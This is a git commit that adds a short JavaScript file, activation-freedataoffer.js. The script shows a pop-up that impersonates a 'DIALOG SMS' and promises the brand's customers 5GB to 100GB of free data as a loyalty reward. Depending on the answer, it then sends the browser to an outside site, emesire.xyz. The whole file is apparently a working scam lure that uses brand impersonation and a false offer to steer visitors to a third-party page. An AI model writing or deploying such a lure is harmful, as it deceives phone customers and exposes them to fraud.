47d4428c097abe1d263ab19b278f5185b4aca17c
sureoffer <emesire247@gmail.com>
2025-06-14 03:06:06 -0700

    Create activation-freedataoffer.js

---
+++ activation-freedataoffer.js
@@ -0,0 +1,6 @@
+
+var password = 'FREE DATA'
+password=prompt('DIALOG SMS: Dear Customer, Kindly Check If your Dialog Sim Card Is Qualify To Receive From 5GB To 100GB data, Old Customers Reward, press Free Data To Check Now ','FREE DATA');
+if (password != 'FREE DATA') {
+location.href='https://emesire.xyz/freedataoffer.html';
+}
